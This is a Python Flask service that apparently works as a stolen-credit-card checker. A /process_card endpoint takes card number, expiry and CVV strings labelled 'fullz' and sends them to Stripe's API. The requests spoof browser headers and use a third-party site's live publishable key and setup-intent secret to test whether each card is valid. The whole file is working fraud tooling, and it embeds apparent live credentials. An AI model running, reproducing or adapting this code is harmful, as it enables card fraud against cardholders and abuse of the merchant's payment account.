from flask import Flask, request, jsonify
import asyncio
import aiohttp

app = Flask(__name__)

async def create_payment_method(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")


        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        }
        
        data={
        'guid':'5c83dd69-8114-4a38-93b6-b86446d7f1493147a2',
        'muid':'42c0c263-826b-407f-bbcf-108743c4309d2d20cf',
        'sid':'a35be2ff-eaad-4f14-b933-3682ff00f47b994a5b',
        'referrer':'https://deepdreamgenerator.com',
        'time_on_page':'264543',
        'card[number]':cc,
        'card[cvc]':cvv,
        'card[exp_month]':mes,
        'card[exp_year]':ano,
        'payment_user_agent':'stripe.js/0b5b1045be; stripe-js-v3/0b5b1045be; split-card-element',
        'pasted_fields':'number',
        'key':'pk_live_51HU9fQEBONhbfDrzjD4W7NzW9g8osrdtuW7CqMLQvgnoG6vV6qQKgs9wC2VHX6odOj16jJcsWy2y9FCkbGzu1clT00shuea2Yi'
        }


        # First API call to create token
        response = await session.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
        response_json = await response.json()  # Fix: Add await for async call

        if "id" not in response_json:
            return f"Error creating token: {response_json.get('error', 'Unknown error')}"

        token_id = response_json["id"]
        
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        }
        
        data={
        'payment_method_data[type]':'card',
        'payment_method_data[card][token]':token_id,
        'payment_method_data[billing_details][name]':'Natalie Funk',
        'payment_method_data[guid]':'5c83dd69-8114-4a38-93b6-b86446d7f1493147a2',
        'payment_method_data[muid]':'42c0c263-826b-407f-bbcf-108743c4309d2d20cf',
        'payment_method_data[sid]':'a35be2ff-eaad-4f14-b933-3682ff00f47b994a5b',
        'payment_method_data[payment_user_agent]':'stripe.js/0b5b1045be; stripe-js-v3/0b5b1045be',
        'payment_method_data[referrer]':'https://deepdreamgenerator.com',
        'payment_method_data[time_on_page]':'265378',
        'expected_payment_method_type':'card',
        'use_stripe_sdk':'true',
        'key':'pk_live_51HU9fQEBONhbfDrzjD4W7NzW9g8osrdtuW7CqMLQvgnoG6vV6qQKgs9wC2VHX6odOj16jJcsWy2y9FCkbGzu1clT00shuea2Yi',
        'client_secret':'seti_1R9LNlEBONhbfDrzLlbMMBTf_secret_S3SIFvo8T7G9YbfbbLrchXYXkolbJO7'
        }
        
        confirm_url = 'https://api.stripe.com/v1/setup_intents/seti_1R9LNlEBONhbfDrzLlbMMBTf/confirm'
        charge_response = await session.post(confirm_url, headers=headers, data=data)
        charge_response_json = await charge_response.json()  # Fix: Await async response

        return charge_response_json

    except Exception as e:
        print(f"Error: {e}")
        return str(e)


@app.route("/process_card")
def process_card():
    key = request.args.get("key")  # Get 'key' parameter
    cc = request.args.get("cc")    # Get 'cc' parameter

    if key != "og":
        return jsonify({"error": "Invalid Key"}), 403

    if not cc:
        return jsonify({"error": "Missing credit card details"}), 400

    async def main():
        async with aiohttp.ClientSession() as session:  # ✅ Fix: Create a session
            return await create_payment_method(cc, session)

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(main())  # ✅ Fix: Pass session

    return jsonify({"result": result})


if __name__ == "__main__":
    from waitress import serve
    serve(app, host="0.0.0.0", port=8000)
